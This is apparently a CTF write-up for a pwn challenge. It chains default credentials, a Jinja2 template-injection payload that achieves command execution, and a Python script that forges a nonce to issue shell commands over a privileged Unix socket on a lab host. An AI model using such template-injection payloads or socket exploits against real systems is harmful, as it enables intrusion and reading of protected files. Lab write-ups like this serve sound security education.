# echochamber-user

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

---

Target `10.48.151.156`: SSH (22) and nginx fronting an "Alert Review Console" (80). The `/login` page prints default credentials (`analyst`/`analyst`) in plaintext; the footer hints at keystroke telemetry via `libechotap.so`.

**SSTI → RCE:** the "preview a draft update" feature POSTs `{"title","body"}` to `/api/alert/preview` and renders `body` through Jinja2 without sanitization - `{{7*7}}` → `49` confirms it. Escalating with `{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}` gives RCE as `analyst` (uid=1001, groups `analyst`, `echo-log`).

**Enumeration via RCE:** the alert queue leaks a classifier spec path, mentions the "warden" symlink-swapping decoy mechanism, and a dispatch table at `/etc/sentinel/dispatch.json` exposing a `shell` handler gated by `nonce_time`.

**The sentinel socket:** `/opt/sentinel/sentinel.py` reveals a Unix socket at `/run/sentinel/ctrl.sock`, run by the `sentinel` user with **CAP_DAC_READ_SEARCH** (can read any file regardless of permissions). Its `exec_shell` handler is gated by `nonce = sha256(f"{minute_epoch}:{SALT}")[:16]`, `SALT = "sentinel-salt-v1-a3b7c2d9"`, accepting ±1 minute of drift - computable entirely from the leaked source.

```python
t = int(time.time()) // 60
nonce = hashlib.sha256(f"{t}:sentinel-salt-v1-a3b7c2d9".encode()).hexdigest()[:16]
cmd = base64.b64encode(b"cat /home/sentinel/*").decode()
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall(json.dumps({"op": "shell", "nonce": nonce, "payload": cmd}).encode() + b"\n")
isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}
```

Decoy flags exist at `/var/lib/warden/decoy/{user,root}.txt` - traps placed by the symlink-swapping "warden" mechanism. Attack chain: default creds → SSTI → RCE as analyst → read sentinel source → compute nonce → socket shell as sentinel (with CAP_DAC_READ_SEARCH) → user flag.
